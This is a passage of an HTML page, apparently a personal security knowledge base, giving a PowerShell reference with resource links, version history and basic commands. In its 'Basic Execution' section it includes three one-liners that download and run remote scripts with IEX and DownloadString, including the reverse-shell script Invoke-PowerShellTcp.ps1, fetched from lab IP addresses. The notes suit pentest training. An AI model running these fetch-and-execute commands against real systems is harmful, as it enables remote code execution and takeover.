



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Powershell - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#powershell" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Powershell
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35" type="checkbox" id="nav-35">
    
    <label class="md-nav__link" for="nav-35">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-35">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4" type="checkbox" id="nav-35-4">
    
    <label class="md-nav__link" for="nav-35-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-35-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9" type="checkbox" id="nav-35-4-9">
    
    <label class="md-nav__link" for="nav-35-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-35-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9-10" type="checkbox" id="nav-35-4-9-10">
    
    <label class="md-nav__link" for="nav-35-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-35-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38" checked>
    
    <label class="md-nav__link" for="nav-38">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Powershell
      </label>
    
    <a href="./" title="Powershell" class="md-nav__link md-nav__link--active">
      Powershell
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" class="md-nav__link">
    Reverse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" class="md-nav__link">
    .Net
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-registry" class="md-nav__link">
    Windows Registry
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    Resources
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-references" class="md-nav__link">
    New References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#development-environment" class="md-nav__link">
    Development Environment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#collections" class="md-nav__link">
    Collections
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" class="md-nav__link">
    Reverse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" class="md-nav__link">
    .Net
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-registry" class="md-nav__link">
    Windows Registry
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#resources" class="md-nav__link">
    Resources
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-references" class="md-nav__link">
    New References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#development-environment" class="md-nav__link">
    Development Environment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="powershell">Powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h1>
<h2 id="collections">Collections<a class="headerlink" href="#collections" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://sid-500.com/downloads/">https://sid-500.com/downloads/</a></li>
<li>Resource: Infosec PowerShell tools, resources, and authors: <a href="https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter&amp;utm_medium=social&amp;utm_content=peerlyst_post&amp;utm_campaign=peerlyst_shared_post">https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter&amp;utm_medium=social&amp;utm_content=peerlyst_post&amp;utm_campaign=peerlyst_shared_post</a></li>
<li>Mayhem scripts: <a href="https://gist.github.com/M3T4L5T3F">https://gist.github.com/M3T4L5T3F</a></li>
<li>Collection of PowerShell network security scripts for system administrators: <a href="https://github.com/thom-s/netsec-ps-scripts">https://github.com/thom-s/netsec-ps-scripts</a></li>
</ul>
<h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
<ul>
<li>An A-Z Index of Windows <strong>PowerShell</strong> commands: <a href="https://ss64.com/ps/">https://ss64.com/ps/</a></li>
<li>Windows <strong>PowerShell</strong> command line syntax: <a href="https://ss64.com/ps/syntax.html">https://ss64.com/ps/syntax.html</a></li>
<li><a href="https://pinvoke.net">https://pinvoke.net</a> - Allowing developers to find, edit and add <code class="codehilite"><span class="n">PInvoke</span></code><a href="https://pinvoke.net/#definePinvoke">*</a> signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET).</li>
<li>Versions<ul>
<li>v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista</li>
<li>v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1)</li>
<li>v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support)</li>
<li>v4: Windows 8.1 (Can be installed on:  Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1)</li>
<li>v5:<ul>
<li>Part of Windows Management Framework (WMF) 5.0.</li>
<li>February 24, 2016.</li>
<li>Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps.</li>
<li>Ability to manage layer 2 network switches</li>
<li>Windows 10 Anniversary Update</li>
<li>Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2</li>
</ul>
</li>
<li>v6: PowerShell Core on 18 August 2016</li>
<li>Versin information: <code class="codehilite"><span class="err">$</span><span class="n">PSVersionTable</span></code>
  <div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="k">Host</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="k">Version</span>
<span class="err">$</span><span class="n">PSVersionTable</span>
</pre></div></li>
</ul>
</li>
<li>Help System<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></li>
<li><code class="codehilite"><span class="n">help</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></li>
<li><code class="codehilite"><span class="k">Update</span><span class="o">-</span><span class="n">Help</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="n">remoting</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span> <span class="n">about_</span><span class="o">*</span><span class="n">remot</span><span class="o">*</span></code></li>
</ul>
</li>
<li>Basic Execution<ul>
<li>64 bit
  <div class="codehilite"><pre><span></span><span class="nv">%SystemRoot%</span>\sysnative\WindowsPowerShell\v1.0\powershell.exe <span class="s2">&quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.17/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</pre></div></li>
<li>32 bit
  <div class="codehilite"><pre><span></span><span class="k">START</span> /MIN /LOW CMD /C <span class="nv">%SystemRoot%</span>\system32\WindowsPowerShell\v1.0\powershell.exe <span class="s2">&quot;IEX(New-Object Net.Webclient).DownloadString(&#39;http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1&#39;)&quot;</span>
</pre></div></li>
<li>Using command line: <code class="codehilite"><span class="n">echo</span> <span class="n">IEX</span><span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.17:8000/Sherlock.ps1&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">PowerShell</span> <span class="o">-</span><span class="n">Noprofile</span> <span class="o">-</span></code></li>
</ul>
</li>
<li>Basic Constructs<ul>
<li>Cmdlets</li>
<li>Function</li>
</ul>
</li>
<li>List all Cmdlets: <ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">CommandTyle</span> <span class="n">Cmdlet</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">Name</span> <span class="o">*</span><span class="n">process</span><span class="o">*</span></code></li>
</ul>
</li>
<li>Aliases: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="k">Alias</span> <span class="o">-</span><span class="n">Name</span> <span class="n">ps</span></code> <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="k">Alias</span> <span class="o">-</span><span class="n">Definition</span> <span class="k">Get</span><span class="o">-</span><span class="n">Process</span></code></li>
<li>Check Environment<ul>
<li><code class="codehilite"><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">WIndows</span><span class="err">\</span><span class="n">Syswow64</span><span class="err">\</span><span class="n">Windowspowershell</span><span class="err">\</span><span class="n">v1</span><span class="p">.</span><span class="mi">0</span><span class="err">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span></code><ul>
<li><code class="codehilite"><span class="n">PSModulePath</span></code></li>
</ul>
</li>
<li>Version info: <code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">v</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span><span class="k">c</span> <span class="err">$</span><span class="n">psversiontable</span></code></li>
<li>Language mode: <code class="codehilite"><span class="err">$</span><span class="k">host</span><span class="p">.</span><span class="n">runspace</span><span class="p">.</span><span class="n">languagemode</span></code></li>
<li>Check if AppLocker is enabled: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">AppLockerPolicy</span> <span class="o">-</span><span class="k">Local</span></code></li>
<li>Powershell Version: <code class="codehilite"><span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="k">Host</span><span class="p">).</span><span class="k">Version</span></code></li>
<li>64bit version: <code class="codehilite"><span class="c">%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe</span></code></li>
</ul>
</li>
<li>Modules<ul>
<li><code class="codehilite"><span class="p">.</span> <span class="p">.</span><span class="err">\</span><span class="n">Example</span><span class="p">.</span><span class="n">ps1</span></code></li>
<li><code class="codehilite"><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">path_to_module</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">verbose</span></code></li>
